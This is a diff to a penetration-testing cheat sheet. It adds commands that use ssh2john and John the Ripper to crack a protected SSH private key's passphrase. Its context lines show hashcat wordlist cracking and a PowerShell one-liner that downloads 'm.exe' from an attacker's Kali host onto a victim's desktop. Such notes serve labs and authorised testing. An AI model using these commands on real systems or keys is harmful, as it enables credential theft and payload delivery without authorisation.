@@ -24,6 +24,8 @@
 * [figure out hash types](https://hashcat.net/wiki/doku.php?id=example_hashes) _page with example hashes and their hashcat type/code_
 * `hashcat -m {hashtype} hashes.txt ~/Documents/git/SecLists/Passwords/*.txt --force`  _try cracking all hashes in hashes.txt against all seclist password text files, using no gpu_
 * `hashcat --example-hashes | grep {piece of hash}` _search the hashcat examples to try and determine a hash type and the code to use for cracking with hashcat_
+* `/usr/share/john/ssh2john.py {private key}` _export password hash from protected private ssh key to a crackable format_
+* `john --format=ssh --wordlist=/usr/share/wordlists/rockyou.txt {file with exported hash}` _crack a ssh private key password with rockyou using jtr_
 
 ## Priv Esc Windows
 * `powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://{kali_ip}:8080/m.exe', 'c:\users\victim\desktop\m.exe') }"` _Powershell download a file_
